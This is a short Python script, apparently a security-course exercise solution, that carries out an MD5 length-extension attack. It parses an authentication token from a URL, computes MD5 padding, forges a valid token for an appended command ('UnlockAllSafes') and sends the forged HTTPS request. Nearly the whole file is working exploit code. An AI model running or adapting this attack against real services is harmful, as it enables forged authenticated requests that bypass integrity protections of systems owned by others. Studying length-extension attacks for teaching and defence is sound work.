import httplib, urlparse, sys, urllib
from pymd5 import md5, padding

url = sys.argv[1]

# Your code to modify url goes here
tokenStart = url.index("=") + 1
tokenEnd = url.index("&")
token = url[tokenStart:tokenEnd]

#new command
newCommand = "&command3=UnlockAllSafes"

#create hash for new command ??
length_of_m = 8 + len(url[(tokenEnd + 1):]) #password + length of end part of URL
bits = (length_of_m + len(padding(length_of_m*8)))*8 #total number of bits of the padded message

#Make new token
h = md5(state = token.decode("hex"), count = bits)
h.update(newCommand)
newToken = h.hexdigest()

#concatenate URL
url = url[:tokenStart] + newToken + url[tokenEnd:] + urllib.quote(padding(length_of_m*8)) + newCommand

#finished URL
parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()

